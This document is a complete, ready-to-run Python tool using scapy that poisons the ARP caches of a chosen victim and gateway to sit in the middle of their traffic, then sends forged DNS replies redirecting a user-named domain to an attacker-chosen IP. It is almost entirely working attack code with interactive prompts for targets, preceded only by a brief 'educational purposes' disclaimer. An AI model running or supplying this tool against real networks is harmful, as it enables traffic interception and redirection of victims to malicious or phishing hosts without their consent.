#!/usr/bin/env python3
import logging
import time
import random
import signal
import sys
import threading
from scapy.all import *

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def attacker_mac():
    """
    Returns the MAC address of the attacker's default interface.
    """
    try:
        return get_if_hwaddr(conf.iface)
    except Exception as e:
        logging.error(f"Error getting attacker's MAC: {e}")
        return "00:00:00:00:00:00"

def get_mac(ip):
    """
    Returns the MAC address for the given IP by sending an ARP request.
    """
    ans, _ = sr(ARP(op=ARP.who_has, pdst=ip), timeout=2, verbose=0)
    for sent, received in ans:
        return received.hwsrc
    return None

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """
    Restores the ARP tables of the victim and gateway.
    """
    logging.info("Restoring ARP tables...")
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)
    logging.info("ARP tables restored.")

def arp_spoof(victim_ip, gateway_ip):
    """
    Continuously sends ARP poison packets to the victim and gateway.
    """
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    if victim_mac is None or gateway_mac is None:
        logging.error("Failed to obtain MAC addresses. Exiting ARP spoofing thread.")
        return

    logging.info(f"Victim MAC: {victim_mac} | Gateway MAC: {gateway_mac}")
    try:
        while True:
            # Tell victim that gateway's IP is at attacker's MAC
            send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac()), verbose=0)
            # Tell gateway that victim's IP is at attacker's MAC
            send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac()), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        sys.exit(0)

def dns_spoof(victim_ip, domain, fake_ip):
    """
    Continuously sends forged DNS responses to the victim for the specified domain.
    """
    logging.info("Starting DNS spoofing...")
    try:
        while True:
            # Craft a spoofed DNS response packet
            spoofed_pkt = (IP(dst=victim_ip) / UDP(dport=53) /
                           DNS(id=random.randint(1, 65535), qr=1, aa=1,
                               qd=DNSQR(qname=domain, qtype="A"),
                               an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip)))
            send(spoofed_pkt, verbose=0)
            logging.info(f"Spoofed {domain} -> {fake_ip} for victim {victim_ip}")
            time.sleep(1)  # Adjust timing as necessary
    except KeyboardInterrupt:
        logging.info("Stopping DNS spoofing...")
        sys.exit(0)

def signal_handler(sig, frame):
    logging.info("Exiting gracefully...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    # Display disclaimer and developer info
    print("===================================")
    print("Disclaimer: This tool is for educational and ethical purposes only.")
    print("By running this tool, you agree not to use it for malicious activities.")
    print("Any illegal use of this tool is the sole responsibility of the user.")
    print("===================================")
    print("\nTool developed by: Sujal Lamichhane\n")
    time.sleep(2)

    # Gather user inputs
    victim_ip = input("Enter Victim's IP Address: ")
    gateway_ip = input("Enter Gateway/DNS Server's IP Address: ")
    domain = input("Enter Domain to Spoof (e.g., www.example.com): ")
    fake_ip = input("Enter Fake IP Address to Redirect to (e.g., 192.168.1.100): ")

    if not victim_ip or not gateway_ip or not domain or not fake_ip:
        logging.error("Error: All fields must be filled.")
        sys.exit(1)

    # Start ARP spoofing in a separate thread (MITM positioning)
    arp_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip))
    arp_thread.daemon = True
    arp_thread.start()

    # Start DNS spoofing (runs continuously until interrupted)
    dns_spoof(victim_ip, domain, fake_ip)

if __name__ == "__main__":
    main()
